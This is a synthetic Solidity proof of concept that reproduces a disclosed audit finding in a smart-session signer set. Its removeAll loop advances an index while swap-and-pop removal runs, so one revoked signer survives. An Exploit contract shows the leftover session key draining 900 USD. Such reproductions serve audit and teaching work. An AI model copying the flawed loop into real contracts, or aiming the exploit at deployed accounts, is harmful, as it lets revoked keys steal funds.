// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Biconomy / Rhinestone Smart Sessions — arrays not cleared while iterating
    (Cantina, AuditVault 42065). SYNTHETIC, cheatcode-free.

    Root cause: EnumerableSet._removeAll (and the same shape in onUninstall)
    walks an index upward while _remove swap-and-pops. AssociatedArrayLib._get
    did not revert past the live length (PR 65 added that check), so the
    iteration finishes and the signer swapped into an earlier slot stays.

    Verbatim loop from EnumerableSet4337.sol before PR 65
    (erc7579/smartsessions@052cae3ab99ba64882e20eec61e55bcd33cb2993):

        uint256 len = _length(set, account);
        for (uint256 i; i < len; i++) {
            _remove(set, account, _at(set, account, i));
        }

    Three signers are installed. Revoke leaves exactly one. That signer still
    executes and pulls 900 USD. The control removes from the tail, the set is
    empty, and the same pull reverts. */

contract Usd {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface ISignerSet {
    function add(address account, address signer) external;
    function removeAll(address account) external;
    function lengthOf(address account) external view returns (uint256);
    function contains(address account, address signer) external view returns (bool);
}

contract Sessions is ISignerSet {
    mapping(address => bytes32[]) internal values;
    mapping(address => mapping(bytes32 => uint256)) internal positions;

    function add(address account, address signer) external {
        bytes32 value = bytes32(uint256(uint160(signer)));
        if (positions[account][value] != 0) return;
        values[account].push(value);
        positions[account][value] = values[account].length;
    }

    function lengthOf(address account) external view returns (uint256) {
        return values[account].length;
    }

    function contains(address account, address signer) external view returns (bool) {
        return positions[account][bytes32(uint256(uint160(signer)))] != 0;
    }

    function removeAll(address account) external {
        _removeAll(account);
    }

    function _length(address account) internal view returns (uint256) {
        return values[account].length;
    }

    // Pre-fix AssociatedArrayLib._get: an index past the live length is zero, not a revert.
    function _at(address account, uint256 index) internal view returns (bytes32) {
        if (index >= values[account].length) return bytes32(0);
        return values[account][index];
    }

    function _remove(address account, bytes32 value) internal returns (bool) {
        uint256 position = positions[account][value];
        if (position == 0) return false;
        uint256 valueIndex = position - 1;
        uint256 lastIndex = values[account].length - 1;
        if (valueIndex != lastIndex) {
            bytes32 lastValue = values[account][lastIndex];
            values[account][valueIndex] = lastValue;
            positions[account][lastValue] = position;
        }
        values[account].pop();
        delete positions[account][value];
        return true;
    }

    function _removeAll(address account) internal {
        uint256 len = _length(account);
        for (uint256 i; i < len; i++) {
            // @> VULN: index i moves forward while _remove swap-and-pops, so the signer moved into this slot is never removed
            _remove(account, _at(account, i));
        }
    }
}

contract SmartAccount {
    ISignerSet public sessions;
    Usd public usd;
    address public owner;

    constructor(ISignerSet _sessions, Usd _usd) {
        sessions = _sessions;
        usd = _usd;
        owner = msg.sender;
    }

    function addSigner(address signer) external {
        require(msg.sender == owner, "owner");
        sessions.add(address(this), signer);
    }

    function revokeAllSigners() external {
        require(msg.sender == owner, "owner");
        sessions.removeAll(address(this));
    }

    function executeAsSigner() external {
        require(sessions.contains(address(this), msg.sender), "revoked");
        uint256 amount = usd.balanceOf(address(this));
        usd.transfer(msg.sender, amount);
    }
}

contract SessionKey {
    SmartAccount public account;

    function bind(SmartAccount _account) external {
        account = _account;
    }

    function pull() external {
        account.executeAsSigner();
    }
}

contract Exploit {
    Usd public usd; // nonce 1
    Sessions public sessions; // nonce 2
    SessionKey public sessionKey; // nonce 3
    SmartAccount public account; // nonce 4

    address public constant SIGNER_A = address(uint160(0xA1));
    address public constant SIGNER_B = address(uint160(0xB2));

    constructor() {
        usd = new Usd();
        sessions = new Sessions();
        sessionKey = new SessionKey();
        account = new SmartAccount(sessions, usd);
        sessionKey.bind(account);
    }

    function run() external {
        usd.mint(address(account), 900 ether);
        account.addSigner(SIGNER_A);
        account.addSigner(SIGNER_B);
        account.addSigner(address(sessionKey));
        uint256 beforeLen = sessions.lengthOf(address(account));
        account.revokeAllSigners();
        uint256 afterLen = sessions.lengthOf(address(account));
        sessionKey.pull();
        uint256 stolen = usd.balanceOf(address(sessionKey));
        uint256 left = usd.balanceOf(address(account));
        require(beforeLen == 3, "three signers");
        require(afterLen == 1, "one signer left");
        require(sessions.contains(address(account), address(sessionKey)), "key still live");
        require(!sessions.contains(address(account), SIGNER_A), "A cleared");
        require(!sessions.contains(address(account), SIGNER_B), "B cleared");
        require(stolen == 900 ether, "moved 900");
        require(left == 0, "account emptied");
    }
}
